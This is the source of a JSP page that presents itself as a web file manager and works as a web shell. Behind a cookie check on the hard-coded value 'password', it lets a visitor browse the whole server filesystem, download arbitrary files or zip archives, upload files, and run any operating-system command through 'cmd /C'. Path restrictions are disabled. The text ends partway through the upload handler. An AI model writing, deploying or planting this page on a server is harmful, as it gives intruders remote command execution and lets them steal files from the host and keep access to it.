<%@page import="java.util.*,
                java.net.*,
                java.text.*,
                java.util.zip.*,
                java.io.*"
%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%
    request.setCharacterEncoding("UTF-8");
    response.setCharacterEncoding("UTF-8");
    Cookie[] cookies = request.getCookies();
    String sec = "";
    if (cookies != null) {
        for (int i = 0; i < cookies.length; i++) {
            if (cookies[i].getName().equals("sec")) {
                sec = cookies[i].getValue();
                break;
            }
        }
    }
    if (!"password".equals(sec)) {
%>
<input type="password" id="sec" style="margin: 20vh auto 1vh; width: 200px; display: block; height: 50px; padding: 20px" />
<input type="submit" value="login" id="login" style="margin: 0 auto; width: 200px; display: block; padding: 12px" />

<script>
    document.getElementById('login').onclick = function () {
        document.cookie = 'sec=' + document.getElementById('sec').value;
        window.location.reload();
    }
</script>
<%
        return;
    }
%>
<%!
    private static final boolean NATIVE_COMMANDS = true;
    private static final boolean RESTRICT_BROWSING = false;
    private static final boolean RESTRICT_WHITELIST = false;
    private static final String RESTRICT_PATH = "/etc;/var";
    private static final int UPLOAD_MONITOR_REFRESH = 2;
    private static final int EDITFIELD_COLS = 85;
    private static final int EDITFIELD_ROWS = 30;
    private static final boolean USE_POPUP = true;
    private static final boolean USE_DIR_PREVIEW = false;
    private static final int DIR_PREVIEW_NUMBER = 10;
    private static final int COMPRESSION_LEVEL = 1;
    private static final String[] FORBIDDEN_DRIVES = {"a:\\"};

    private static final long MAX_PROCESS_RUNNING_TIME = 60 * 1000;

    private static final String SAVE_AS_ZIP = "Download selected files as zip";
    private static final String RENAME_FILE = "Rename File";
    private static final String DELETE_FILES = "Delete selected files";
    private static final String CREATE_DIR = "Create Dir";
    private static final String CREATE_FILE = "Create File";
    private static final String MOVE_FILES = "Move Files";
    private static final String COPY_FILES = "Copy Files";

    private static String tempdir = ".";
    private static DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    public class UplInfo {

        public long totalSize;
        public long currSize;
        public long starttime;
        public boolean aborted;

        public UplInfo() {
            totalSize = 0l;
            currSize = 0l;
            starttime = System.currentTimeMillis();
            aborted = false;
        }

        public UplInfo(int size) {
            totalSize = size;
            currSize = 0;
            starttime = System.currentTimeMillis();
            aborted = false;
        }

        public String getUprate() {
            long time = System.currentTimeMillis() - starttime;
            if (time != 0) {
                long uprate = currSize * 1000 / time;
                return convertFileSize(uprate) + "/s";
            } else return "n/a";
        }

        public int getPercent() {
            if (totalSize == 0) return 0;
            else return (int) (currSize * 100 / totalSize);
        }

        public String getTimeElapsed() {
            long time = (System.currentTimeMillis() - starttime) / 1000l;
            if (time - 60l >= 0) {
                if (time % 60 >= 10) return time / 60 + ":" + (time % 60) + "m";
                else return time / 60 + ":0" + (time % 60) + "m";
            } else return time < 10 ? "0" + time + "s" : time + "s";
        }

        public String getTimeEstimated() {
            if (currSize == 0) return "n/a";
            long time = System.currentTimeMillis() - starttime;
            time = totalSize * time / currSize;
            time /= 1000l;
            if (time - 60l >= 0) {
                if (time % 60 >= 10) return time / 60 + ":" + (time % 60) + "m";
                else return time / 60 + ":0" + (time % 60) + "m";
            } else return time < 10 ? "0" + time + "s" : time + "s";
        }

    }

    public class FileInfo {

        public String name = null, clientFileName = null, fileContentType = null;
        private byte[] fileContents = null;
        public File file = null;
        public StringBuffer sb = new StringBuffer(100);

        public void setFileContents(byte[] aByteArray) {
            fileContents = new byte[aByteArray.length];
            System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);
        }
    }

    public static class UploadMonitor {

        static Hashtable uploadTable = new Hashtable();

        static void set(String fName, UplInfo info) {
            uploadTable.put(fName, info);
        }

        static void remove(String fName) {
            uploadTable.remove(fName);
        }

        static UplInfo getInfo(String fName) {
            UplInfo info = (UplInfo) uploadTable.get(fName);
            return info;
        }
    }
    public class HttpMultiPartParser {

        private final String lineSeparator = System.getProperty("line.separator", "\n");
        private final int ONE_MB = 1024 * 1;

        public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,
                                     int clength) throws IllegalArgumentException, IOException {
            if (is == null) throw new IllegalArgumentException("InputStream");
            if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(
                    "\"" + boundary + "\" is an illegal boundary indicator");
            boundary = "--" + boundary;
            StringTokenizer stLine = null, stFields = null;
            FileInfo fileInfo = null;
            Hashtable dataTable = new Hashtable(5);
            String line = null, field = null, paramName = null;
            boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);
            boolean isFile = false;
            if (saveFiles) {
                File f = new File(saveInDir);
                f.mkdirs();
            }
            line = getLine(is);
            if (line == null || !line.startsWith(boundary)) throw new IOException(
                    "Boundary not found; boundary = " + boundary + ", line = " + line);
            while (line != null) {
                if (line == null || !line.startsWith(boundary)) return dataTable;
                line = getLine(is);
                if (line == null) return dataTable;
                stLine = new StringTokenizer(line, ";\r\n");
                if (stLine.countTokens() < 2) throw new IllegalArgumentException(
                        "Bad data in second line");
                line = stLine.nextToken().toLowerCase();
                if (line.indexOf("form-data") < 0) throw new IllegalArgumentException(
                        "Bad data in second line");
                stFields = new StringTokenizer(stLine.nextToken(), "=\"");
                if (stFields.countTokens() < 2) throw new IllegalArgumentException(
                        "Bad data in second line");
                fileInfo = new FileInfo();
                stFields.nextToken();
                paramName = stFields.nextToken();
                isFile = false;
                if (stLine.hasMoreTokens()) {
                    field = stLine.nextToken();
                    stFields = new StringTokenizer(field, "=\"");
                    if (stFields.countTokens() > 1) {
                        if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {
                            fileInfo.name = paramName;
                            String value = stFields.nextToken();
                            if (value != null && value.trim().length() > 0) {
                                fileInfo.clientFileName = value;
                                isFile = true;
                            } else {
                                line = getLine(is);
                                line = getLine(is);
                                line = getLine(is);
                                line = getLine(is);
                                continue;
                            }
                        }
                    } else if (field.toLowerCase().indexOf("filename") >= 0) {
                        line = getLine(is);
                        line = getLine(is);
                        line = getLine(is);
                        line = getLine(is);
                        continue;
                    }
                }
                boolean skipBlankLine = true;
                if (isFile) {
                    line = getLine(is);
                    if (line == null) return dataTable;
                    if (line.trim().length() < 1) skipBlankLine = false;
                    else {
                        stLine = new StringTokenizer(line, ": ");
                        if (stLine.countTokens() < 2) throw new IllegalArgumentException(
                                "Bad data in third line");
                        stLine.nextToken();
                        fileInfo.fileContentType = stLine.nextToken();
                    }
                }
                if (skipBlankLine) {
                    line = getLine(is);
                    if (line == null) return dataTable;
                }
                if (!isFile) {
                    line = getLine(is);
                    if (line == null) return dataTable;
                    dataTable.put(paramName, line);
                    if (paramName.equals("dir")) saveInDir = line;
                    line = getLine(is);
                    continue;
                }
                try {
                    UplInfo uplInfo = new UplInfo(clength);
                    UploadMonitor.set(fileInfo.clientFileName, uplInfo);
                    OutputStream os = null;
                    String path = null;
                    if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,
                            fileInfo.clientFileName));
                    else os = new ByteArrayOutputStream(ONE_MB);
                    boolean readingContent = true;
                    byte previousLine[] = new byte[2 * ONE_MB];
                    byte temp[] = null;
                    byte currentLine[] = new byte[2 * ONE_MB];
                    int read, read3;
                    if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {
                        line = null;
                        break;
                    }
                    while (readingContent) {
                        if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {
                            line = null;
                            uplInfo.aborted = true;
                            break;
                        }
                        if (compareBoundary(boundary, currentLine)) {
                            os.write(previousLine, 0, read - 2);
                            line = new String(currentLine, 0, read3);
                            break;
                        } else {
                            os.write(previousLine, 0, read);
                            uplInfo.currSize += read;
                            temp = currentLine;
                            currentLine = previousLine;
                            previousLine = temp;
                            read = read3;
                        }//end else
                    }//end while
                    os.flush();
                    os.close();
                    if (!saveFiles) {
                        ByteArrayOutputStream baos = (ByteArrayOutputStream) os;
                        fileInfo.setFileContents(baos.toByteArray());
                    } else fileInfo.file = new File(path);
                    dataTable.put(paramName, fileInfo);
                    uplInfo.currSize = uplInfo.totalSize;
                }//end try
                catch (IOException e) {
                    throw e;
                }
            }
            return dataTable;
        }

        private boolean compareBoundary(String boundary, byte ba[]) {
            byte b;
            if (boundary == null || ba == null) return false;
            for (int i = 0; i < boundary.length(); i++)
                if ((byte) boundary.charAt(i) != ba[i]) return false;
            return true;
        }

        private synchronized String getLine(ServletInputStream sis) throws IOException {
            byte b[] = new byte[1024];
            int read = sis.readLine(b, 0, b.length), index;
            String line = null;
            if (read != -1) {
                line = new String(b, 0, read);
                if ((index = line.indexOf('\n')) >= 0) line = line.substring(0, index - 1);
            }
            return line;
        }

        public String getFileName(String dir, String fileName) throws IllegalArgumentException {
            String path = null;
            if (dir == null || fileName == null) throw new IllegalArgumentException(
                    "dir or fileName is null");
            int index = fileName.lastIndexOf('/');
            String name = null;
            if (index >= 0) name = fileName.substring(index + 1);
            else name = fileName;
            index = name.lastIndexOf('\\');
            if (index >= 0) fileName = name.substring(index + 1);
            path = dir + File.separator + fileName;
            if (File.separatorChar == '/') return path.replace('\\', File.separatorChar);
            else return path.replace('/', File.separatorChar);
        }
    }

    class FileComp implements Comparator {

        int mode;
        int sign;

        FileComp() {
            this.mode = 1;
            this.sign = 1;
        }

        FileComp(int mode) {
            if (mode < 0) {
                this.mode = -mode;
                sign = -1;
            } else {
                this.mode = mode;
                this.sign = 1;
            }
        }

        public int compare(Object o1, Object o2) {
            File f1 = (File) o1;
            File f2 = (File) o2;
            if (f1.isDirectory()) {
                if (f2.isDirectory()) {
                    switch (mode) {
                        case 1:
                        case 4:
                            return sign
                                    * f1.getAbsolutePath().toUpperCase().compareTo(
                                    f2.getAbsolutePath().toUpperCase());
                        case 2:
                            return sign * (new Long(f1.length()).compareTo(new Long(f2.length())));
                        case 3:
                            return sign
                                    * (new Long(f1.lastModified())
                                    .compareTo(new Long(f2.lastModified())));
                        default:
                            return 1;
                    }
                } else return -1;
            } else if (f2.isDirectory()) return 1;
            else {
                switch (mode) {
                    case 1:
                        return sign
                                * f1.getAbsolutePath().toUpperCase().compareTo(
                                f2.getAbsolutePath().toUpperCase());
                    case 2:
                        return sign * (new Long(f1.length()).compareTo(new Long(f2.length())));
                    case 3:
                        return sign
                                * (new Long(f1.lastModified()).compareTo(new Long(f2.lastModified())));
                    case 4: {
                        int tempIndexf1 = f1.getAbsolutePath().lastIndexOf('.');
                        int tempIndexf2 = f2.getAbsolutePath().lastIndexOf('.');
                        if ((tempIndexf1 == -1) && (tempIndexf2 == -1)) {
                            return sign
                                    * f1.getAbsolutePath().toUpperCase().compareTo(
                                    f2.getAbsolutePath().toUpperCase());
                        }
                        else if (tempIndexf1 == -1) return -sign;
                        else if (tempIndexf2 == -1) return sign;
                        else {
                            String tempEndf1 = f1.getAbsolutePath().toUpperCase()
                                    .substring(tempIndexf1);
                            String tempEndf2 = f2.getAbsolutePath().toUpperCase()
                                    .substring(tempIndexf2);
                            return sign * tempEndf1.compareTo(tempEndf2);
                        }
                    }
                    default:
                        return 1;
                }
            }
        }
    }

    static Vector expandFileList(String[] files, boolean inclDirs) {
        Vector v = new Vector();
        if (files == null) return v;
        for (int i = 0; i < files.length; i++)
            v.add(new File(URLDecoder.decode(files[i])));
        for (int i = 0; i < v.size(); i++) {
            File f = (File) v.get(i);
            if (f.isDirectory()) {
                File[] fs = f.listFiles();
                for (int n = 0; n < fs.length; n++)
                    v.add(fs[n]);
                if (!inclDirs) {
                    v.remove(i);
                    i--;
                }
            }
        }
        return v;
    }

    static String getDir(String dir, String name) {
        if (!dir.endsWith(File.separator)) dir = dir + File.separator;
        File mv = new File(name);
        String new_dir = null;
        if (!mv.isAbsolute()) {
            new_dir = dir + name;
        } else new_dir = name;
        return new_dir;
    }

    static String convertFileSize(long size) {
        int divisor = 1;
        String unit = "bytes";
        if (size >= 1024 * 1024) {
            divisor = 1024 * 1024;
            unit = "MB";
        } else if (size >= 1024) {
            divisor = 1024;
            unit = "KB";
        }
        if (divisor == 1) return size / divisor + " " + unit;
        String aftercomma = "" + 100 * (size % divisor) / divisor;
        if (aftercomma.length() == 1) aftercomma = "0" + aftercomma;
        return size / divisor + "." + aftercomma + " " + unit;
    }

    static void copyStreams(InputStream in, OutputStream out, byte[] buffer) throws IOException {
        copyStreamsWithoutClose(in, out, buffer);
        in.close();
        out.close();
    }

    static void copyStreamsWithoutClose(InputStream in, OutputStream out, byte[] buffer)
            throws IOException {
        int b;
        while ((b = in.read(buffer)) != -1)
            out.write(buffer, 0, b);
    }

    static String getMimeType(String fName) {
        fName = fName.toLowerCase();
        if (fName.endsWith(".jpg") || fName.endsWith(".jpeg") || fName.endsWith(".jpe")) return "image/jpeg";
        else if (fName.endsWith(".gif")) return "image/gif";
        else if (fName.endsWith(".pdf")) return "application/pdf";
        else if (fName.endsWith(".htm") || fName.endsWith(".html") || fName.endsWith(".shtml")) return "text/html";
        else if (fName.endsWith(".avi")) return "video/x-msvideo";
        else if (fName.endsWith(".mov") || fName.endsWith(".qt")) return "video/quicktime";
        else if (fName.endsWith(".mpg") || fName.endsWith(".mpeg") || fName.endsWith(".mpe")) return "video/mpeg";
        else if (fName.endsWith(".zip")) return "application/zip";
        else if (fName.endsWith(".tiff") || fName.endsWith(".tif")) return "image/tiff";
        else if (fName.endsWith(".rtf")) return "application/rtf";
        else if (fName.endsWith(".mid") || fName.endsWith(".midi")) return "audio/x-midi";
        else if (fName.endsWith(".xl") || fName.endsWith(".xls") || fName.endsWith(".xlv")
                || fName.endsWith(".xla") || fName.endsWith(".xlb") || fName.endsWith(".xlt")
                || fName.endsWith(".xlm") || fName.endsWith(".xlk")) return "application/excel";
        else if (fName.endsWith(".doc") || fName.endsWith(".dot")) return "application/msword";
        else if (fName.endsWith(".png")) return "image/png";
        else if (fName.endsWith(".xml")) return "text/xml";
        else if (fName.endsWith(".svg")) return "image/svg+xml";
        else if (fName.endsWith(".mp3")) return "audio/mp3";
        else if (fName.endsWith(".ogg")) return "audio/ogg";
        else return "text/plain";
    }

    static String conv2Html(int i) {
        if (i == '&') return "&amp;";
        else if (i == '<') return "&lt;";
        else if (i == '>') return "&gt;";
        else if (i == '"') return "&quot;";
        else return "" + (char) i;
    }

    static String conv2Html(String st) {
        StringBuffer buf = new StringBuffer();
        for (int i = 0; i < st.length(); i++) {
            buf.append(conv2Html(st.charAt(i)));
        }
        return buf.toString();
    }

    static String startProcess(String command, String dir) throws IOException {
	final String[] COMMAND_INTERPRETER = {"cmd", "/C"}; // Dos,Windows
	//final String[] COMMAND_INTERPRETER = {"/bin/sh","-c"}; 	// Unix
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        String[] comm = new String[3];
        comm[0] = COMMAND_INTERPRETER[0];
        comm[1] = COMMAND_INTERPRETER[1];
        comm[2] = command;
        long start = System.currentTimeMillis();
        try {
            //Start process
            Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));
            //Get input and error streams
            BufferedInputStream ls_in = new BufferedInputStream(ls_proc.getInputStream());
            BufferedInputStream ls_err = new BufferedInputStream(ls_proc.getErrorStream());
            boolean end = false;
            while (!end) {
                int c = 0;
                while ((ls_err.available() > 0) && (++c <= 1000)) {
                    bos.write(ls_err.read());
                }
                c = 0;
                while ((ls_in.available() > 0) && (++c <= 1000)) {
                    bos.write(ls_in.read());
                }
                try {
                    ls_proc.exitValue();
                    //if the process has not finished, an exception is thrown
                    //else
                    while (ls_err.available() > 0)
                        bos.write(ls_err.read());
                    while (ls_in.available() > 0)
                        bos.write(ls_in.read());
                    end = true;
                } catch (IllegalThreadStateException ex) {
                    //Process is running
                }
                //The process is not allowed to run longer than given time.
                if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {
                    ls_proc.destroy();
                    end = true;
                    bos.write("!!!! Process has timed out, destroyed !!!!!".getBytes("utf-8"));
                }
                try {
                    Thread.sleep(50);
                } catch (InterruptedException ie) {
                }
            }
        } catch (Exception e) {
        }
        String s = null;
        try {
            s = conv2Html(bos.toString("Big5"));
        }catch (Exception e){
        }finally {
            try {
                bos.close();
            } catch (Exception e) {
            }
        }
        return s;
    }

    static boolean isWindows() {
        return System.getProperties().getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1;
    }

    static String dir2linkdir(String dir, String browserLink, int sortMode) {
        File f = new File(dir);
        StringBuffer buf = new StringBuffer();
        while (f.getParentFile() != null) {
            if (f.canRead()) {
                String encPath = f.getAbsolutePath();
                buf.insert(0, "<a href=\"" + browserLink + "?sort=" + sortMode + "&amp;dir="
                        + encPath + "\">" + conv2Html(f.getName()) + File.separator + "</a>");
            } else buf.insert(0, conv2Html(f.getName()) + File.separator);
            f = f.getParentFile();
        }
        if (f.canRead()) {
            String encPath = f.getAbsolutePath();
            buf.insert(0, "<a href=\"" + browserLink + "?sort=" + sortMode + "&amp;dir=" + encPath
                    + "\">" + conv2Html(f.getAbsolutePath()) + "</a>");
        } else buf.insert(0, f.getAbsolutePath());
        return buf.toString();
    }

    static boolean isPacked(String name, boolean gz) {
        return (name.toLowerCase().endsWith(".zip") || name.toLowerCase().endsWith(".jar")
                || (gz && name.toLowerCase().endsWith(".gz")) || name.toLowerCase()
                .endsWith(".war"));
    }

    static boolean isAllowed(File path) throws IOException {
        if (RESTRICT_BROWSING) {
            StringTokenizer stk = new StringTokenizer(RESTRICT_PATH, ";");
            while (stk.hasMoreTokens()) {
                if (path != null && path.getCanonicalPath().startsWith(stk.nextToken()))
                    return RESTRICT_WHITELIST;
            }
            return !RESTRICT_WHITELIST;
        } else return true;
    }

%>
<%
    request.setAttribute("dir", request.getParameter("dir")!=null? URLDecoder.decode(request.getParameter("dir"),"UTF-8"):"");
    final String browser_name = request.getRequestURI();
    final String FOL_IMG = "";
    boolean nohtml = false;
    boolean dir_view = true;
    if (request.getParameter("file") != null) {
        File f = new File(URLDecoder.decode(request.getParameter("file"),"UTF-8"));
        if (!isAllowed(f)) {
            request.setAttribute("dir", f.getParent());
            request.setAttribute("error", "You are not allowed to access " + f.getAbsolutePath());
        } else if (f.exists() && f.canRead()) {
            if (isPacked(f.getName(), false)) {
            } else {
                String mimeType = getMimeType(f.getName());
                response.setContentType(mimeType);
                if (mimeType.equals("text/plain")) response.setHeader(
                        "Content-Disposition", "inline;filename=\"temp.txt\"");
                else response.setHeader("Content-Disposition", "inline;filename=\""
                        + f.getName() + "\"");
                BufferedInputStream fileInput = new BufferedInputStream(new FileInputStream(f));
                OutputStream downout = response.getOutputStream();
                byte[] bytes = new byte[8 * 1024];
                int len = -1;
                while ((len = fileInput.read(bytes)) != -1) {
                    downout.write(bytes, 0, len);
                }
                fileInput.close();
                downout.flush();
                downout.close();
                out.clear();
                out = pageContext.pushBody();
                nohtml = true;
                dir_view = false;
            }
        } else {
            request.setAttribute("dir", f.getParent());
            request.setAttribute("error", "File " + f.getAbsolutePath()
                    + " does not exist or is not readable on the server");
        }
    }
    else if ((request.getParameter("Submit") != null)
            && (request.getParameter("Submit").equals(SAVE_AS_ZIP))) {
        Vector v = expandFileList(request.getParameterValues("selfile"), false);
        String notAllowedFile = null;
        for (int i = 0; i < v.size(); i++) {
            File f = (File) v.get(i);
            if (!isAllowed(f)) {
                notAllowedFile = f.getAbsolutePath();
                break;
            }
        }
        if (notAllowedFile != null) {
            request.setAttribute("error", "You are not allowed to access " + notAllowedFile);
        } else if (v.size() == 0) {
            request.setAttribute("error", "No files selected");
        } else {
            File dir_file = new File("" + request.getAttribute("dir"));
            int dir_l = dir_file.getAbsolutePath().length();
            response.setContentType("application/zip");
            response.setHeader("Content-Disposition", "attachment;filename=\"rename_me.zip\"");
            out.clearBuffer();
            File file = new File(dir_file, new Date().getTime() + ".zip");
            file.createNewFile();
            FileOutputStream fos = new FileOutputStream(file);
            ZipOutputStream zipout = new ZipOutputStream(fos);
            zipout.setLevel(COMPRESSION_LEVEL);
            for (int i = 0; i < v.size(); i++) {
                File f = (File) v.get(i);
                if (f.canRead()) {
                    zipout.putNextEntry(new ZipEntry(f.getAbsolutePath().substring(dir_l + 1)));
                    BufferedInputStream fr = new BufferedInputStream(new FileInputStream(f));
                    byte buffer[] = new byte[0xffff];
                    copyStreamsWithoutClose(fr, zipout, buffer);
                    fr.close();
                    zipout.closeEntry();
                }
            }
            zipout.finish();
            fos.close();
            response.setContentLength((int) file.length());
            BufferedInputStream fileInput = new BufferedInputStream(new FileInputStream(file));
            OutputStream downout = response.getOutputStream();
            byte[] bytes = new byte[8 * 1024];
            int len = -1;
            while ((len = fileInput.read(bytes)) != -1) {
                downout.write(bytes, 0, len);
            }
            fileInput.close();
            downout.flush();
            downout.close();
            out.clear();
            out = pageContext.pushBody();
            file.delete();
            nohtml = true;
            dir_view = false;
        }
    }
    else if (request.getParameter("downfile") != null) {
        String filePath = request.getParameter("downfile");
        File f = new File(filePath);
        if (!isAllowed(f)) {
            request.setAttribute("dir", f.getParent());
            request.setAttribute("error", "You are not allowed to access " + f.getAbsoluteFile());
        } else if (f.exists() && f.canRead()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment;filename=\"" + java.net.URLEncoder.encode(f.getName(),"UTF-8").replace("+", "%20")
                    + "\"");
            response.setContentLength((int) f.length());
            BufferedInputStream fileInput = new BufferedInputStream(new FileInputStream(f));
            OutputStream downout = response.getOutputStream();
            byte[] bytes = new byte[8 * 1024];
            int len = -1;
            while ((len = fileInput.read(bytes)) != -1) {
                downout.write(bytes, 0, len);
            }
            fileInput.close();
            downout.flush();
            downout.close();
            out.clear();
            out = pageContext.pushBody();
            nohtml = true;
            dir_view = false;
        } else {
            request.setAttribute("dir", f.getParent());
            request.setAttribute("error", "File " + f.getAbsolutePath()
                    + " does not exist or is not readable on the server");
        }
    }
    if (nohtml) return;
    if (request.getAttribute("dir") == null) {
        String path = null;
        if (application.getRealPath(request.getRequestURI()) != null) path = new File(
                application.getRealPath(request.getRequestURI())).getParent();

        if (path == null) {
            path = new File(".").getAbsolutePath();
        }
        if (!isAllowed(new File(path))) {
            if (RESTRICT_PATH.indexOf(";") < 0) path = RESTRICT_PATH;
            else path = RESTRICT_PATH.substring(0, RESTRICT_PATH.indexOf(";"));
        }
        request.setAttribute("dir", path);
    }%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<meta name="robots" content="noindex">
<meta http-equiv="expires" content="0">
<meta http-equiv="pragma" content="no-cache">
<link href="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/minireset.css/0.0.2/minireset.min.css" type="text/css" rel="stylesheet"/>
<% if (request.getParameter("uplMonitor") == null) {%>
	
    <style type="text/css">
        .button,input {
            color: #666666;
            border: 1px solid #999999;
            padding: 5px 10px 5px;
            border-radius: 5px;
        }

        .button:Hover {
            color: #444444
        }

        table.filelist {
            background-color: #666666;
            width: 100%;
            border: 0px none #ffffff;
        }

        th {
           padding: 5px 10px;
           background-color: #e8e8e8
        }

        tr.mouseout {
            background-color: #ffffff;
        }

        tr.mousein {
            background-color: #eeeeee;
        }

        tr.checked {
            background-color: #e8e8e8
        }

        tr.mousechecked {
            background-color: #d1d1d1
        }

        td {
            padding: 5px 10px;
            font-family: Verdana, Arial, Helvetica, sans-serif;
            color: #666666;
            border: 1px #d4d4d4 solid;
        }

        td.message {
            background-color: #FFFF00;
            color: #000000;
            text-align: center;
            font-weight: bold
        }

        td.error {
            background-color: #ffe4e4;
            color: #000000;
            text-align: center;
            font-weight: bold
        }

        A {
            color: #778899;
            text-decoration: none;
        }

        A:Hover {
            color: #376694;
            text-decoration: none;
        }

        BODY {
            color: #666666;
        }
    </style>
	<%}
		
        //Check path
        if (!isAllowed(new File((String)request.getAttribute("dir")))){
            request.setAttribute("error", "You are not allowed to access " + request.getAttribute("dir"));
        }
		//Upload monitor
		else if (request.getParameter("uplMonitor") != null) {%>
	<style type="text/css">
		BODY { font-family:Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666;}
	</style><%
			String fname = request.getParameter("uplMonitor");
			//First opening
			boolean first = false;
			if (request.getParameter("first") != null) first = true;
			UplInfo info = new UplInfo();
			if (!first) {
				info = UploadMonitor.getInfo(fname);
				if (info == null) {
					//Windows
					int posi = fname.lastIndexOf("\\");
					if (posi != -1) info = UploadMonitor.getInfo(fname.substring(posi + 1));
				}
				if (info == null) {
					//Unix
					int posi = fname.lastIndexOf("/");
					if (posi != -1) info = UploadMonitor.getInfo(fname.substring(posi + 1));
				}
			}
			dir_view = false;
			request.setAttribute("dir", null);
			if (info.aborted) {
				UploadMonitor.remove(fname);
				%>
</head>
<body>
<b>Upload of <%=fname%></b><br><br>
Upload aborted.</body>
</html><%
			}
			else if (info.totalSize != info.currSize || info.currSize == 0) {
				%>
<META HTTP-EQUIV="Refresh" CONTENT="<%=UPLOAD_MONITOR_REFRESH%>;URL=<%=browser_name %>?uplMonitor=<%=URLEncoder.encode(fname)%>">
</head>
<body>
<b>Upload of <%=fname%></b><br><br>
<center>
<table height="20px" width="90%" bgcolor="#eeeeee" style="border:1px solid #cccccc"><tr>
<td bgcolor="blue" width="<%=info.getPercent()%>%"></td><td width="<%=100-info.getPercent()%>%"></td>
</tr></table></center>
<%=convertFileSize(info.currSize)%> from <%=convertFileSize(info.totalSize)%>
(<%=info.getPercent()%> %) uploaded (Speed: <%=info.getUprate()%>).<br>
Time: <%=info.getTimeElapsed()%> from <%=info.getTimeEstimated()%>
</body>
</html><%
			}
			else {
				UploadMonitor.remove(fname);
				%>
</head>
<body onload="javascript:window.close()">
<b>Upload of <%=fname%></b><br><br>
Upload finished.
</body>
</html><%
    }
}
else if (request.getParameter("command") != null) {
    if (!NATIVE_COMMANDS) {
        request.setAttribute("error", "Execution of native commands is not allowed!");
    } else if (!"Cancel".equalsIgnoreCase(request.getParameter("Submit"))) {
%>
<title>Launch commands in <%=request.getAttribute("dir")%>
</title>
</head>
<body>
<%
    out.println("<form action=\"" + browser_name + "\" method=\"Post\">\n"
            + "<textarea name=\"text\" wrap=\"off\" cols=\"" + EDITFIELD_COLS
            + "\" rows=\"" + EDITFIELD_ROWS + "\" readonly>");
    String ret = "";
    if (!request.getParameter("command").equalsIgnoreCase(""))
        ret = startProcess(
                request.getParameter("command"), (String) request.getAttribute("dir"));
    out.println(ret);
    out.println("</textarea>");
%>
<input type="hidden" name="dir" value="<%= request.getAttribute("dir")%>">
<br>
<table>
    <tr>
        <td title="Enter your command">
            <input size="<%=EDITFIELD_COLS%>" type="text" name="command" value="">
        </td>
    </tr>
    <tr>
        <td><input type="Submit" name="Submit" value="Launch">
            <input type="hidden" name="sort" value="<%=request.getParameter("sort")%>">
            <input type="Submit" name="Submit" value="Cancel"></td>
    </tr>
</table>
</form>
</body>
</html>
<%
        dir_view = false;
        request.setAttribute("dir", null);
    }
}
else if (request.getParameter("file") != null) {
    File f = new File(URLDecoder.decode(request.getParameter("file"),"UTF-8"));
    if (!isAllowed(f)) {
        request.setAttribute("error", "You are not allowed to access " + f.getAbsolutePath());
    } else if (isPacked(f.getName(), false)) {
        try {
            ZipFile zf = new ZipFile(f);
            Enumeration entries = zf.entries();
%>
<title><%= f.getAbsolutePath()%>
</title>
</head>
<body>
<h2>Content of <%=conv2Html(f.getName())%>
</h2><br>
<table class="filelist" cellspacing="1px" cellpadding="0px">
    <th>Name</th>
    <th>Uncompressed size</th>
    <th>Compressed size</th>
    <th>Compr. ratio</th>
    <th>Date</th>
    <%
        long size = 0;
        int fileCount = 0;
        while (entries.hasMoreElements()) {
            ZipEntry entry = (ZipEntry) entries.nextElement();
            if (!entry.isDirectory()) {
                fileCount++;
                size += entry.getSize();
                long ratio = 0;
                if (entry.getSize() != 0) ratio = (entry.getCompressedSize() * 100)
                        / entry.getSize();
                out.println("<tr class=\"mouseout\"><td>" + conv2Html(entry.getName())
                        + "</td><td>" + convertFileSize(entry.getSize()) + "</td><td>"
                        + convertFileSize(entry.getCompressedSize()) + "</td><td>"
                        + ratio + "%" + "</td><td>"
                        + dateFormat.format(new Date(entry.getTime())) + "</td></tr>");

            }
        }
        zf.close();
        dir_view = false;
        request.setAttribute("dir", null);
    %>
</table>
<p align=center>
    <b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression
        ratio: <%=(f.length() * 100) / size%>%
    </b></p>
</body>
</html>
<%
        } catch (ZipException ex) {
            request.setAttribute("error", "Cannot read " + f.getName()
                    + ", no valid zip file");
        } catch (IOException ex) {
            request.setAttribute("error", "Reading of " + f.getName() + " aborted. Error: "
                    + ex);
        }
    }
}
else if ((request.getContentType() != null)
        && (request.getContentType().toLowerCase().startsWith("multipart"))) {
    response.setContentType("text/html");
    HttpMultiPartParser parser = new HttpMultiPartParser();
    boolean error = false;
    try {
        int bstart = request.getContentType().lastIndexOf("oundary=");
        String bound = request.getContentType().substring(bstart + 8);
        int clength = request.getContentLength();
        Hashtable ht = parser
                .processData(request.getInputStream(), bound, tempdir, clength);
        if (!isAllowed(new File((String) ht.get("dir")))) {
            request.setAttribute("error", "You are not allowed to access " + ht.get("dir"));
            error = true;
        } else if (ht.get("myFile") != null) {
            FileInfo fi = (FileInfo) ht.get("myFile");
            File f = fi.file;
            UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
            if (info != null && info.aborted) {
                f.delete();
                request.setAttribute("error", "Upload aborted");
            } else {
                String path = (String) ht.get("dir");
                if (!path.endsWith(File.separator)) path = path + File.separator;
                if (!f.renameTo(new File(path + f.getName()))) {
                    request.setAttribute("error", "Cannot upload file.");
                    error = true;
                    f.delete();
                }
            }
        } else {
            request.setAttribute("error", "No file selected for upload");
            error = true;
        }
        request.setAttribute("dir", (String) ht.get("dir"));
    } catch (Exception e) {
